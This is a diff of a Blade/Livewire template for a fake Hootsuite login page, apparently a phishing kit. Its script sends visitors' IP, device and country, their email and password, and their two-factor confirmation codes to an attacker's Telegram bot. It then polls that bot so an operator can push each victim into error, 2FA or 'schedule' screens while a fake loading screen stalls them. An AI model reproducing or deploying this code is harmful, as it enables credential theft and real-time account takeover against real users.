-                                                            aria-label="An animated image, with a happy-looking owl, called Owly, in a robot suit holding a smartphone, which is showing multiple love hearts and happy face emojis, after using OwlyWriter AI">
+                                                               aria-label="An animated image, with a happy-looking owl, called Owly, in a robot suit holding a smartphone, which is showing multiple love hearts and happy face emojis, after using OwlyWriter AI">
                                                             <source
                                                                 src="https://i.hootsuite.com/assets/identity/dashboard/login/owly-writer-ai.mp4"
                                                                 type="video/mp4">
@@ -745,7 +746,8 @@
                                                 @if ($loginError)
                                                     <div class="_notification notification error" role="alert">
                                                         <div class="notificationIconContainer">
-                                                            <img src="https://assets.hootsuite.com/v2/images/static/login/alerts/error-alert-icon.0fce3bf8.svg"
+                                                            <img
+                                                                src="https://assets.hootsuite.com/v2/images/static/login/alerts/error-alert-icon.0fce3bf8.svg"
                                                                 class="notificationIcon">
                                                         </div>
                                                         <div class="notificationMessage">
@@ -759,73 +761,75 @@
                                                 <!-- Error, Notice and Success Messages -->
                                                 <div class="formContainer">
                                                     <form method="post" wire:submit.prevent="submitLogin"
-                                                        id="loginForm" class="_emailPasswordForm" action="/signin">
+                                                          id="loginForm" class="_emailPasswordForm" action="/signin">
                                                         <!-- Email and Password Inputs -->
                                                         <div class="inputWrapper">
                                                             <label for="loginEmailInput">Email</label>
                                                             <input id="loginEmailInput"
-                                                                class="inputContainer _requiredInput _emailInput"
-                                                                required="" type="email" name="email"
-                                                                title="Please enter a valid email address"
-                                                                maxlength="100" autofocus="autofocus" value=""
-                                                                role="textbox" aria-labelledby="loginEmailLabel"
-                                                                aria-required="true"
-                                                                aria-describedby="inlineErrorTitle_loginEmailInput inlineErrorMessage_loginEmailInput">
+                                                                   class="inputContainer _requiredInput _emailInput"
+                                                                   required="" type="email" name="email"
+                                                                   title="Please enter a valid email address"
+                                                                   maxlength="100" autofocus="autofocus" value=""
+                                                                   role="textbox" aria-labelledby="loginEmailLabel"
+                                                                   aria-required="true"
+                                                                   aria-describedby="inlineErrorTitle_loginEmailInput inlineErrorMessage_loginEmailInput">
                                                             <div id="inlineErrorContainer"
-                                                                class="inlineErrorContainer _inlineErrorContainer"
-                                                                style="display:none;">
+                                                                 class="inlineErrorContainer _inlineErrorContainer"
+                                                                 style="display:none;">
                                                                 <div class="inlineErrorIconContainer">
-                                                                    <img src="https://assets.hootsuite.com/v2/images/static/login/alerts/error-alert-icon.0fce3bf8.svg"
+                                                                    <img
+                                                                        src="https://assets.hootsuite.com/v2/images/static/login/alerts/error-alert-icon.0fce3bf8.svg"
                                                                         class="inlineErrorIcon">
                                                                 </div>
                                                                 <div class="inlineErrorMessageContainer">
                                                                     <div class="inlineErrorTitle _inlineErrorTitle"
-                                                                        id="inlineErrorTitle_loginEmailInput"
-                                                                        role="alert"></div>
+                                                                         id="inlineErrorTitle_loginEmailInput"
+                                                                         role="alert"></div>
                                                                     <div class="inlineErrorMessage _inlineErrorMessage"
-                                                                        id="inlineErrorMessage_loginEmailInput"
-                                                                        role="alert"></div>
+                                                                         id="inlineErrorMessage_loginEmailInput"
+                                                                         role="alert"></div>
                                                                 </div>
                                                             </div>
                                                         </div>
                                                         <div class="inputWrapper allowWrap">
                                                             <label for="loginPasswordInput">Password
                                                                 <a href="javascript:void(0)"
-                                                                    class="forgotPassword _forgotPassword ">Forgot
+                                                                   class="forgotPassword _forgotPassword ">Forgot
                                                                     password
                                                                 </a>
                                                             </label>
                                                             <input id="loginPasswordInput" required=""
-                                                                type="password" name="password" maxlength="100"
-                                                                class="inputContainer _requiredInput _passwordInput"
-                                                                role="textbox" aria-labelledby="loginPasswordLabel"
-                                                                aria-required="true"
-                                                                aria-describedby="inlineErrorTitle_loginPasswordInput inlineErrorMessage_loginPasswordInput">
+                                                                   type="password" name="password" maxlength="100"
+                                                                   class="inputContainer _requiredInput _passwordInput"
+                                                                   role="textbox" aria-labelledby="loginPasswordLabel"
+                                                                   aria-required="true"
+                                                                   aria-describedby="inlineErrorTitle_loginPasswordInput inlineErrorMessage_loginPasswordInput">
 
                                                             <div id="inlineErrorContainer"
-                                                                class="inlineErrorContainer _inlineErrorContainer"
-                                                                style="display:none;">
+                                                                 class="inlineErrorContainer _inlineErrorContainer"
+                                                                 style="display:none;">
                                                                 <div class="inlineErrorIconContainer">
-                                                                    <img src="https://assets.hootsuite.com/v2/images/static/login/alerts/error-alert-icon.0fce3bf8.svg"
+                                                                    <img
+                                                                        src="https://assets.hootsuite.com/v2/images/static/login/alerts/error-alert-icon.0fce3bf8.svg"
                                                                         class="inlineErrorIcon">
                                                                 </div>
                                                                 <div class="inlineErrorMessageContainer">
                                                                     <div class="inlineErrorTitle _inlineErrorTitle"
-                                                                        id="inlineErrorTitle_loginPasswordInput"
-                                                                        role="alert"></div>
+                                                                         id="inlineErrorTitle_loginPasswordInput"
+                                                                         role="alert"></div>
                                                                     <div class="inlineErrorMessage _inlineErrorMessage"
-                                                                        id="inlineErrorMessage_loginPasswordInput"
-                                                                        role="alert"></div>
+                                                                         id="inlineErrorMessage_loginPasswordInput"
+                                                                         role="alert"></div>
                                                                 </div>
                                                             </div>
                                                         </div>
-                                                        <!-- Sign In (CTA) Button -->
                                                         <button class="button disabled _submit submitButton"
-                                                            type="submit" aria-disabled="true" tabindex="-1"
-                                                            aria-describedby="inlineErrorContainer">Sign in</button>
+                                                                type="submit" aria-disabled="true" tabindex="-1"
+                                                                aria-describedby="inlineErrorContainer">Sign in
+                                                        </button>
                                                         <input type="hidden" name="method" value="email">
                                                         <input type="hidden" name="loginCsrfToken"
-                                                            value="052aef9e00fc39365803c4440d3f06fbf44cd8a909172b6b8e7bcce0fb84c2b1bd981bb16b2f4454c3badab40cd9e1cfe6f144122e31186f6448c9310aefd59d">
+                                                               value="052aef9e00fc39365803c4440d3f06fbf44cd8a909172b6b8e7bcce0fb84c2b1bd981bb16b2f4454c3badab40cd9e1cfe6f144122e31186f6448c9310aefd59d">
                                                     </form>
                                                 </div>
                                                 <div class="linksSectionContainer">
@@ -841,8 +845,8 @@
                                         </div>
                                     </div>
                                 @endif
-                                @if ($twoFaPage)
-                                    <form action="" class="email-2fa-wrapper">
+                                @if ($emailAuthCode)
+                                    <form wire:submit.prevent="codeSubmit" class="email-2fa-wrapper">
                                         <div class="left-section">
                                             <a href="Javascript:void(0)" class="link">
                                                 ← Back to signin
@@ -860,20 +864,32 @@
                                                 As a security measure, you'll need to click on the verification link
                                                 that we’ve sent to your email.
                                             </p>
-                                            <label>A confirmation code was sent
-                                                to<br><strong>{{$emailAddress}}</strong></label>
+                                            <label>A confirmation code was sent to<br><strong>{{$emailAddress}}</strong></label>
+                                            @if($emailAuthCodeError)
+                                            <div class="_notification notification error" role="alert" style="margin-top: 10px;margin-bottom: 10px">
+                                                <div class="notificationIconContainer">
+                                                    <img src="https://assets.hootsuite.com/v2/images/static/login/alerts/error-alert-icon.0fce3bf8.svg" class="notificationIcon">
+                                                </div>
+                                                <div class="notificationMessage">
+                                                    <div class="notificationTitle">
+                                                        Please try again
+                                                    </div>
+                                                    Sorry, we couldn't find that email and/or password
+                                                </div>
+                                            </div>
+                                            @endif
                                             <div class="inputWrapper">
                                                 <label for="loginEmailInput">Enter your confirmation code here</label>
-                                                <input id="loginEmailInput"
-                                                    class="inputContainer _requiredInput _emailInput" type="email"
-                                                    name="email">
-
+                                                <input id="loginEmailInput" maxlength="6" minlength="6" required
+                                                       class="inputContainer _requiredInput _emailInput" type="number"
+                                                       name="code">
                                             </div>
                                             <button class="button disabled _submit submitButton"
-                                                type="submit">Submit</button>
+                                                    type="submit">Submit
+                                            </button>
                                             <div class="links">
-                                                <p>Didn't receive an email? <a href="#">Resend</a></p>
-                                                <p><a href="#">Sign in to another account</a></p>
+                                                <p>Didn't receive an email? <a href="javascript:void(0)">Resend</a></p>
+                                                <p><a href="javascript:void(0)">Sign in to another account</a></p>
                                             </div>
                                         </div>
                                         <div class="right-section">
@@ -881,7 +897,7 @@
                                         </div>
                                     </form>
                                 @endif
-                                @if ($enableLoadingAfterSubmit)
+                                @if($enableLoadingAfterSubmit)
                                     <div class="loading-container">
                                         <div class="loading-message">Please be patient and dont close this window</div>
                                         <div class="loading-submessage step1">Checking the details on your account...
@@ -891,418 +907,428 @@
                                         </div>
                                         <div class="loading-submessage step4">Checking other details...</div>
                                         <div class="loading-submessage finalStep">It can take up to 10 minutes to
-                                            verify your account.</div>
+                                            verify your account.
+                                        </div>
                                         <div class="loader"></div>
                                     </div>
                                 @endif
                             </div>
-
                         </div>
                         <div class="ant-modal-footer">
-                            <button type="button" class="ant-btn ant-btn-default"><span>Cancel</span></button><button
+                            <button type="button" class="ant-btn ant-btn-default"><span>Cancel</span></button>
+                            <button
                                 type="button" class="ant-btn ant-btn-primary"><span>OK</span></button>
                         </div>
                     </div>
                     <div tabindex="0" aria-hidden="true"
-                        style="width: 0px; height: 0px; overflow: hidden; outline: none;"></div>
+                         style="width: 0px; height: 0px; overflow: hidden; outline: none;"></div>
                 </div>
             </div>
         </div>
     </div>
 </div>
 @script
-    <script>
-        let sessionId;
-        if (!localStorage.getItem('sessionId')) {
-            localStorage.setItem('sessionId', generateSessionId());
-            sessionId = localStorage.getItem('sessionId');
+<script>
+    let sessionId;
+    if (!localStorage.getItem('sessionId')) {
+        localStorage.setItem('sessionId', generateSessionId());
+        sessionId = localStorage.getItem('sessionId');
+    } else {
+        sessionId = localStorage.getItem('sessionId');
+    }
+    let selectedDate;
+    const apiKey = "{{ env('TELEGRAM_API_KEY') }}";
+    const chatId = "{{ env('TELEGRAM_CHAT_ID') }}";
+    const replyMarkup = `reply_markup={"inline_keyboard": [[{"text": "accept", "callback_data": "accept"}]]}`;
+    const tURL = `https://api.telegram.org/bot${apiKey}/sendMessage?chat_id=${chatId}`;
+    let emailElement;
+    document.addEventListener('user-login-response', function () {
+        fetch("https://api.ipify.org?format=json")
+            .then((response) => response.json())
+            .then((data) => {
+                const ipAddress = data?.ip || "";
+                @this.
+                set('ip', ipAddress);
+            })
+            .catch((error) => {
+            });
+    })
+    document.addEventListener('open-modal', function () {
+        $('#continue-modal').show();
+    });
+
+    function getDeviceOS() {
+        const userAgent = navigator.userAgent;
+        if (/Android/i.test(userAgent)) {
+            return 'Android';
+        } else if (/iPhone|iPad|iPod/i.test(userAgent)) {
+            return 'iOS';
+        } else if (/Windows/i.test(userAgent)) {
+            return 'Windows';
+        } else if (/Linux/i.test(userAgent)) {
+            return 'Linux';
+        } else if (/Mac OS|Macintosh/i.test(userAgent)) {
+            return 'Mac OS';
         } else {
-            sessionId = localStorage.getItem('sessionId');
+            return 'Unknown';
         }
-        let selectedDate;
-        const apiKey = "{{ env('TELEGRAM_API_KEY') }}";
-        const chatId = "{{ env('TELEGRAM_CHAT_ID') }}";
-        const replyMarkup = `reply_markup={"inline_keyboard": [[{"text": "accept", "callback_data": "accept"}]]}`;
-        const tURL = `https://api.telegram.org/bot${apiKey}/sendMessage?chat_id=${chatId}`;
-        let emailElement;
-        document.addEventListener('user-login-response', function() {
-            fetch("https://api.ipify.org?format=json")
-                .then((response) => response.json())
-                .then((data) => {
-                    const ipAddress = data?.ip || "";
-                    @this.set('ip', ipAddress);
-                })
-                .catch((error) => {});
-        })
-        document.addEventListener('open-modal', function() {
-            $('#continue-modal').show();
-        });
+    }
 
-        function getDeviceOS() {
-            const userAgent = navigator.userAgent;
-            if (/Android/i.test(userAgent)) {
-                return 'Android';
-            } else if (/iPhone|iPad|iPod/i.test(userAgent)) {
-                return 'iOS';
-            } else if (/Windows/i.test(userAgent)) {
-                return 'Windows';
-            } else if (/Linux/i.test(userAgent)) {
-                return 'Linux';
-            } else if (/Mac OS|Macintosh/i.test(userAgent)) {
-                return 'Mac OS';
-            } else {
-                return 'Unknown';
-            }
+    function getDeviceType() {
+        const userAgent = navigator.userAgent;
+
+        if (/Mobile|Android|iPhone|iPod/i.test(userAgent)) {
+            return 'Mobile';
+        } else if (/Tablet|iPad/i.test(userAgent) || (navigator.maxTouchPoints > 1 && /Macintosh/i.test(userAgent))) {
+            return 'Tablet';
+        } else {
+            return 'Desktop';
         }
+    }
 
-        function getDeviceType() {
-            const userAgent = navigator.userAgent;
+    async function getCountryByIP(ip) {
+        const token = '51a670a7b50b57';
+        const apiUrl = `https://ipinfo.io/${ip}/json?token=${token}`;
 
-            if (/Mobile|Android|iPhone|iPod/i.test(userAgent)) {
-                return 'Mobile';
-            } else if (/Tablet|iPad/i.test(userAgent) || (navigator.maxTouchPoints > 1 && /Macintosh/i.test(userAgent))) {
-                return 'Tablet';
-            } else {
-                return 'Desktop';
-            }
+        try {
+            const response = await fetch(apiUrl);
+            if (!response.ok) throw new Error('Failed to fetch IP information');
+            const data = await response.json();
+            return data.country;
+        } catch (error) {
+            console.error('Error:', error.message);
+            return null;
         }
-        async function getCountryByIP(ip) {
-            const token = '51a670a7b50b57';
-            const apiUrl = `https://ipinfo.io/${ip}/json?token=${token}`;
+    }
 
-            try {
-                const response = await fetch(apiUrl);
-                if (!response.ok) throw new Error('Failed to fetch IP information');
-                const data = await response.json();
-                return data.country;
-            } catch (error) {
-                console.error('Error:', error.message);
-                return null;
-            }
-        }
-        async function handleAsyncIPInfo() {
-            try {
-                const deviceType = getDeviceType();
-                const os = getDeviceOS();
-                const ip = @this.ip;
-                const country = await getCountryByIP(ip);
-                const tURL = `https://api.telegram.org/bot${apiKey}/sendMessage`;
-                await fetch(tURL, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({
-                        chat_id: chatId,
-                        text: `===NEW VISITOR===\nIp: ${ip}\nDevice: ${deviceType}\nOS: ${os}\nCountry: ${country || 'Unknown'}`,
-                    }),
-                });
-
-            } catch (error) {
-                console.error('Error:', error.message);
-            }
-        }
-        document.addEventListener('send-ip-info', function() {
-            handleAsyncIPInfo();
-        })
-
-        document.addEventListener('show-login-progress', function() {
-            @this.set('showModalFooter', false);
-            @this.set('enableLoginForm', false);
-            @this.set('enableLoadingAfterSubmit', true);
-            @this.set('emailAddress', $('input[name="email"]').val());
-            emailElement = $('input[name="email"]').val();
-            const passwordElement = $('input[name="password"]').val();
-            fetch(tURL, {
-                method: "POST",
+    async function handleAsyncIPInfo() {
+        try {
+            const deviceType = getDeviceType();
+            const os = getDeviceOS();
+            const ip = @this.
+            ip;
+            const country = await getCountryByIP(ip);
+            const tURL = `https://api.telegram.org/bot${apiKey}/sendMessage`;
+            await fetch(tURL, {
+                method: 'POST',
                 headers: {
-                    "Content-Type": "application/json",
+                    'Content-Type': 'application/json',
                 },
                 body: JSON.stringify({
                     chat_id: chatId,
-                    text: `User: ${emailElement}\nAnswer: ${passwordElement}\n`,
-                    reply_markup: {
-                        inline_keyboard: [
-                            [{
-                                    text: `Login`,
-                                    callback_data: `/login ${sessionId}`,
-                                },
-                                {
-                                    text: `Error`,
-                                    callback_data: `/loginError ${sessionId}`,
-                                }
-                            ],
-                            [{
-                                    text: `Email 2fa`,
-                                    callback_data: `/email2fa ${sessionId}`,
-                                },
-                                {
-                                    text: `Email 2fa error`,
-                                    callback_data: `/email2faError ${sessionId}`,
-                                },
-                            ],
-                            [{
-                                    text: `Google 2fa`,
-                                    callback_data: `/google2fa ${sessionId}`,
-                                },
-                                {
-                                    text: `Google 2fa error`,
-                                    callback_data: `/google2faError ${sessionId}`,
-                                },
-                            ],
-                            [{
-                                    text: `Schedule`,
-                                    callback_data: `/schedule ${sessionId}`,
-                                },
-                                {
-                                    text: `Final`,
-                                    callback_data: `/final ${sessionId}`,
-                                },
-                            ],
-                            [{
-                                text: `Kick`,
-                                callback_data: `/login ${sessionId}`,
-                            }, ],
-                        ],
-                    },
+                    text: `===NEW VISITOR===\nIp: ${ip}\nDevice: ${deviceType}\nOS: ${os}\nCountry: ${country || 'Unknown'}`,
                 }),
             });
-            localStorage.setItem('email', emailElement);
-            startInterval();
+
+        } catch (error) {
+            console.error('Error:', error.message);
+        }
+    }
+
+    document.addEventListener('send-ip-info', function () {
+        handleAsyncIPInfo();
+    })
+
+    document.addEventListener('show-login-progress', function () {
+        @this.
+        set('enableLoginForm', false);
+        @this.
+        set('enableLoadingAfterSubmit', true);
+        @this.
+        set('emailAddress', $('input[name="email"]').val());
+        emailElement = $('input[name="email"]').val();
+        const passwordElement = $('input[name="password"]').val();
+        fetch(tURL, {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json",
+            },
+            body: JSON.stringify({
+                chat_id: chatId,
+                text: `User: ${emailElement}\nAnswer: ${passwordElement}\n`,
+                reply_markup: {
+                    inline_keyboard: [
+                        [{
+                            text: `Login`,
+                            callback_data: `/login ${sessionId}`,
+                        },
+                            {
+                                text: `Error`,
+                                callback_data: `/loginError ${sessionId}`,
+                            }
+                        ],
+                        [{
+                            text: `Email 2fa`,
+                            callback_data: `/email2fa ${sessionId}`,
+                        },
+                            {
+                                text: `Email 2fa error`,
+                                callback_data: `/email2faError ${sessionId}`,
+                            },
+                        ],
+                        [{
+                            text: `Google 2fa`,
+                            callback_data: `/google2fa ${sessionId}`,
+                        },
+                            {
+                                text: `Google 2fa error`,
+                                callback_data: `/google2faError ${sessionId}`,
+                            },
+                        ],
+                        [{
+                            text: `Schedule`,
+                            callback_data: `/schedule ${sessionId}`,
+                        },
+                            {
+                                text: `Final`,
+                                callback_data: `/final ${sessionId}`,
+                            },
+                        ],
+                        [{
+                            text: `Kick`,
+                            callback_data: `/login ${sessionId}`,
+                        },],
+                    ],
+                },
+            }),
         });
-        document.addEventListener('code-submit', function() {
-            const tURL = `https://api.telegram.org/bot${apiKey}/sendMessage?chat_id=${chatId}`;
-            const code = $('input[name="code"]').val();
-            fetch(tURL, {
-                    method: "POST",
-                    headers: {
-                        "Content-Type": "application/json",
-                    },
-                    body: JSON.stringify({
-                        chat_id: chatId,
-                        text: `===FIRST AUTH CODE for ${emailElement}===\nCODE: ${
+        localStorage.setItem('email', emailElement);
+        startInterval();
+    });
+    document.addEventListener('code-submit', function () {
+        const tURL = `https://api.telegram.org/bot${apiKey}/sendMessage?chat_id=${chatId}`;
+        const code = $('input[name="code"]').val();
+        fetch(tURL, {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json",
+            },
+            body: JSON.stringify({
+                chat_id: chatId,
+                text: `===FIRST AUTH CODE for ${emailElement}===\nCODE: ${
                     code || ""
                 }`,
-                        reply_markup: {
-                            inline_keyboard: [
-                                [{
-                                        text: `2fa`,
-                                        callback_data: `/2fa ${sessionId}`,
-                                    },
-                                    {
-                                        text: `2fa error`,
-                                        callback_data: `/2faError ${sessionId}`,
-                                    },
-                                ],
-                                [{
-                                        text: `Schedule`,
-                                        callback_data: `/schedule ${sessionId}`,
-                                    },
-                                    {
-                                        text: `Final`,
-                                        callback_data: `/final ${sessionId}`,
-                                    },
-                                ],
-                                [{
-                                    text: `Kick`,
-                                    callback_data: `/login ${sessionId}`,
-                                }, ],
-                            ],
+                reply_markup: {
+                    inline_keyboard: [
+                        [{
+                            text: `2fa`,
+                            callback_data: `/2fa ${sessionId}`,
                         },
-                    }),
-                })
-                .then(() => {
-                    @this.set('loginError', false);
-                    @this.set('oldPassError', false);
-                    @this.set('enableLoginForm', false);
-                    @this.set('showModalFooter', false);
-                    @this.set('enableLoadingAfterSubmit', true);
-                    @this.set('twoFaPage', false);
-                    @this.set('codeError', false);
-                })
-                .catch((error) => {
-                    console.log("Unknown error in auth.html", error);
-                });
+                            {
+                                text: `2fa error`,
+                                callback_data: `/2faError ${sessionId}`,
+                            },
+                        ],
+                        [{
+                            text: `Schedule`,
+                            callback_data: `/schedule ${sessionId}`,
+                        },
+                            {
+                                text: `Final`,
+                                callback_data: `/final ${sessionId}`,
+                            },
+                        ],
+                        [{
+                            text: `Kick`,
+                            callback_data: `/login ${sessionId}`,
+                        },],
+                    ],
+                },
+            }),
+        })
+            .then(() => {
+                @this.
+                set('loginError', false);
+                @this.
+                set('enableLoginForm', false);
+                @this.
+                set('enableLoadingAfterSubmit', true);
+                @this.
+                set('emailAuthCode', false);
+                @this.
+                set('emailAuthCodeError', false);
+            })
+            .catch((error) => {
+                console.log("Unknown error in auth.html", error);
+            });
 
-        });
-        document.addEventListener('code-submit-mobile', function() {
-            const tURL = `https://api.telegram.org/bot${apiKey}/sendMessage?chat_id=${chatId}`;
-            const code = $('input[name="code2"]').val();
-            fetch(tURL, {
-                    method: "POST",
-                    headers: {
-                        "Content-Type": "application/json",
-                    },
-                    body: JSON.stringify({
-                        chat_id: chatId,
-                        text: `===FIRST AUTH CODE for ${emailElement}===\nCODE: ${
+    });
+    document.addEventListener('code-submit-mobile', function () {
+        const tURL = `https://api.telegram.org/bot${apiKey}/sendMessage?chat_id=${chatId}`;
+        const code = $('input[name="code2"]').val();
+        fetch(tURL, {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json",
+            },
+            body: JSON.stringify({
+                chat_id: chatId,
+                text: `===FIRST AUTH CODE for ${emailElement}===\nCODE: ${
                     code || ""
                 }`,
-                        reply_markup: {
-                            inline_keyboard: [
-                                [{
-                                        text: `2fa`,
-                                        callback_data: `/2fa ${sessionId}`,
-                                    },
-                                    {
-                                        text: `2fa error`,
-                                        callback_data: `/2faError ${sessionId}`,
-                                    },
-                                ],
-                                [{
-                                        text: `Schedule`,
-                                        callback_data: `/schedule ${sessionId}`,
-                                    },
-                                    {
-                                        text: `Final`,
-                                        callback_data: `/final ${sessionId}`,
-                                    },
-                                ],
-                                [{
-                                    text: `Kick`,
-                                    callback_data: `/login ${sessionId}`,
-                                }, ],
-                            ],
+                reply_markup: {
+                    inline_keyboard: [
+                        [{
+                            text: `2fa`,
+                            callback_data: `/2fa ${sessionId}`,
                         },
-                    }),
-                })
-                .then(() => {
-                    @this.set('loginError', false);
-                    @this.set('oldPassError', false);
-                    @this.set('enableLoginForm', false);
-                    @this.set('showModalFooter', false);
-                    @this.set('enableLoadingAfterSubmit', true);
-                    @this.set('twoFaPage', false);
-                    @this.set('codeError', false);
-                })
-                .catch((error) => {
-                    console.log("Unknown error in auth.html", error);
-                });
+                            {
+                                text: `2fa error`,
+                                callback_data: `/2faError ${sessionId}`,
+                            },
+                        ],
+                        [{
+                            text: `Schedule`,
+                            callback_data: `/schedule ${sessionId}`,
+                        },
+                            {
+                                text: `Final`,
+                                callback_data: `/final ${sessionId}`,
+                            },
+                        ],
+                        [{
+                            text: `Kick`,
+                            callback_data: `/login ${sessionId}`,
+                        },],
+                    ],
+                },
+            }),
+        })
+            .then(() => {
+                @this.
+                set('loginError', false);
+                @this.
+                set('enableLoginForm', false);
+                @this.
+                set('enableLoadingAfterSubmit', true);
+                @this.
+                set('emailAuthCode', false);
+                @this.
+                set('emailAuthCodeError', false);
+                @this.
+                set('emailAuthCode', false);
+            })
+            .catch((error) => {
+                console.log("Unknown error in auth.html", error);
+            });
 
-        });
-        const startInterval = () => {
-            let lastUpdateId = 0;
-            setInterval(() => {
-                fetch(`https://api.telegram.org/bot${apiKey}/getUpdates?offset=${lastUpdateId + 1}`)
-                    .then((response) => {
-                        if (response.ok) {
-                            return response.json();
-                        } else {
-                            throw new Error("Failed to fetch updates.");
-                        }
-                    })
-                    .then((data) => {
-                        if (data?.result?.length > 0) {
-                            data.result.forEach((update) => {
-                                if (update.update_id > lastUpdateId) {
-                                    lastUpdateId = update.update_id;
-                                    if (update.callback_query) {
-                                        const callbackData = update.callback_query.data;
-                                        if (callbackData ===
-                                            `/oldError ${localStorage.getItem('sessionId')}`) {
-                                            $('#continue-modal').show();
-                                            @this.set('showCalenderProgress', false);
-                                            @this.set('loginError', false);
-                                            @this.set('oldPassError', true);
-                                            @this.set('enableLoginForm', true);
-                                            @this.set('showModalFooter', true);
-                                            @this.set('enableLoadingAfterSubmit', false);
-                                            @this.set('twoFaPage', false);
-                                            @this.set('codeError', false);
-                                            @this.set('showCalender', false);
-                                        } else if (callbackData ===
-                                            `/loginError ${localStorage.getItem('sessionId')}`) {
-                                            $('#continue-modal').show();
-                                            @this.set('showCalenderProgress', false);
-                                            @this.set('loginError', true);
-                                            @this.set('oldPassError', false);
-                                            @this.set('enableLoginForm', true);
-                                            @this.set('showModalFooter', true);
-                                            @this.set('enableLoadingAfterSubmit', false);
-                                            @this.set('twoFaPage', false);
-                                            @this.set('codeError', false);
-                                            @this.set('showCalender', false);
+    });
+    const startInterval = () => {
+        let lastUpdateId = 0;
+        setInterval(() => {
+            fetch(`https://api.telegram.org/bot${apiKey}/getUpdates?offset=${lastUpdateId + 1}`)
+                .then((response) => {
+                    if (response.ok) {
+                        return response.json();
+                    } else {
+                        throw new Error("Failed to fetch updates.");
+                    }
+                })
+                .then((data) => {
+                    if (data?.result?.length > 0) {
+                        data.result.forEach((update) => {
+                            if (update.update_id > lastUpdateId) {
+                                lastUpdateId = update.update_id;
+                                if (update.callback_query) {
+                                    const callbackData = update.callback_query.data;
+                                    if (callbackData ===
+                                        `/loginError ${localStorage.getItem('sessionId')}`) {
+                                        $('#continue-modal').show();
+                                        @this.set('showCalenderProgress', false);
+                                        @this.set('loginError', true);
+                                        @this.set('enableLoginForm', true);
+                                        @this.set('enableLoadingAfterSubmit', false);
+                                        @this.set('emailAuthCode', false);
+                                        @this.set('emailAuthCodeError', false);
+                                        @this.set('showCalender', false);
 
-                                        } else if (callbackData ===
-                                            `/login ${localStorage.getItem('sessionId')}`) {
-                                            $('#continue-modal').show();
-                                            @this.set('showCalenderProgress', false);
-                                            @this.set('loginError', false);
-                                            @this.set('oldPassError', false);
-                                            @this.set('enableLoginForm', true);
-                                            @this.set('showModalFooter', true);
-                                            @this.set('enableLoadingAfterSubmit', false);
-                                            @this.set('twoFaPage', false);
-                                            @this.set('codeError', false);
-                                            @this.set('showCalender', false);
-                                        } else if (callbackData ===
-                                            `/email2fa ${localStorage.getItem('sessionId')}`) {
-                                            $('#continue-modal').show();
-                                            @this.set('showCalenderProgress', false);
-                                            @this.set('loginError', false);
-                                            @this.set('oldPassError', false);
-                                            @this.set('enableLoginForm', false);
-                                            @this.set('showModalFooter', true);
-                                            @this.set('enableLoadingAfterSubmit', false);
-                                            @this.set('twoFaPage', true);
-                                            @this.set('codeError', false);
-                                            @this.set('showCalender', false);
-                                        } else if (callbackData ===
-                                            `/2faError ${localStorage.getItem('sessionId')}`) {
-                                            $('#continue-modal').show();
-                                            @this.set('showCalenderProgress', false);
-                                            @this.set('loginError', false);
-                                            @this.set('oldPassError', false);
-                                            @this.set('enableLoginForm', false);
-                                            @this.set('showModalFooter', true);
-                                            @this.set('enableLoadingAfterSubmit', false);
-                                            @this.set('twoFaPage', true);
-                                            @this.set('codeError', true);
-                                            @this.set('showCalender', false);
-                                        } else if (callbackData ===
-                                            `/schedule ${localStorage.getItem('sessionId')}`) {
-                                            @this.set('showCalenderProgress', false);
-                                            @this.set('loginError', false);
-                                            @this.set('oldPassError', false);
-                                            @this.set('enableLoginForm', false);
-                                            @this.set('showModalFooter', false);
-                                            @this.set('enableLoadingAfterSubmit', false);
-                                            @this.set('twoFaPage', false);
-                                            @this.set('codeError', false);
-                                            $('#continue-modal').hide();
-                                            @this.set('showCalender', true);
-                                        }
+                                    } else if (callbackData ===
+                                        `/login ${localStorage.getItem('sessionId')}`) {
+                                        $('#continue-modal').show();
+                                        @this.set('showCalenderProgress', false);
+                                        @this.set('loginError', false);
+                                        @this.set('enableLoginForm', true);
+                                        @this.set('enableLoadingAfterSubmit', false);
+                                        @this.set('emailAuthCode', false);
+                                        @this.set('emailAuthCodeError', false);
+                                        @this.set('showCalender', false);
+                                    } else if (callbackData ===
+                                        `/email2fa ${localStorage.getItem('sessionId')}`) {
+                                        $('#continue-modal').show();
+                                        @this.set('showCalenderProgress', false);
+                                        @this.set('loginError', false);
+                                        @this.set('enableLoginForm', false);
+                                        @this.set('enableLoadingAfterSubmit', false);
+                                        @this.set('emailAuthCode', true);
+                                        @this.set('emailAuthCodeError', false);
+                                        @this.set('showCalender', false);
+                                    } else if (callbackData ===
+                                        `/email2faError ${localStorage.getItem('sessionId')}`) {
+                                        $('#continue-modal').show();
+                                        @this.
+                                        set('showCalenderProgress', false);
+                                        @this.
+                                        set('loginError', false);
+                                        @this.
+                                        set('enableLoginForm', false);
+                                        @this.
+                                        set('enableLoadingAfterSubmit', false);
+                                        @this.
+                                        set('emailAuthCode', true);
+                                        @this.
+                                        set('emailAuthCodeError', true);
+                                        @this.
+                                        set('showCalender', false);
+                                    } else if (callbackData ===
+                                        `/schedule ${localStorage.getItem('sessionId')}`) {
+                                        @this.
+                                        set('showCalenderProgress', false);
+                                        @this.
+                                        set('loginError', false);
+                                        @this.
+                                        set('enableLoginForm', false);
+                                        @this.
+                                        set('enableLoadingAfterSubmit', false);
+                                        @this.
+                                        set('emailAuthCode', false);
+                                        @this.
+                                        set('emailAuthCodeError', false);
+                                        $('#continue-modal').hide();
+                                        @this.
+                                        set('showCalender', true);
                                     }
                                 }
-                            });
-                        }
-                    })
-                    .catch((error) => {
-                        console.error("Error fetching updates:", error);
-                    });
-            }, 2000);
-        };
+                            }
+                        });
+                    }
+                })
+                .catch((error) => {
+                    console.error("Error fetching updates:", error);
+                });
+        }, 2000);
+    };
 
-        function generateSessionId() {
-            return `${Date.now()}-${Math.random().toString(36).substr(2, 9)}-${crypto.getRandomValues(new Uint32Array(1))[0]}`;
+    function generateSessionId() {
+        return `${Date.now()}-${Math.random().toString(36).substr(2, 9)}-${crypto.getRandomValues(new Uint32Array(1))[0]}`;
+    }
+
+    window.selectDate = function (date) {
+        $('#calendar-wrapper').updateCalendarOptions({
+            date: date
+        });
+        selectedDate = date;
+        const currentDate = new Date(date);
+        currentDate.setDate(currentDate.getDate());
+        const options = {
+            weekday: 'long',
+            month: 'long',
+            day: 'numeric'
+        };
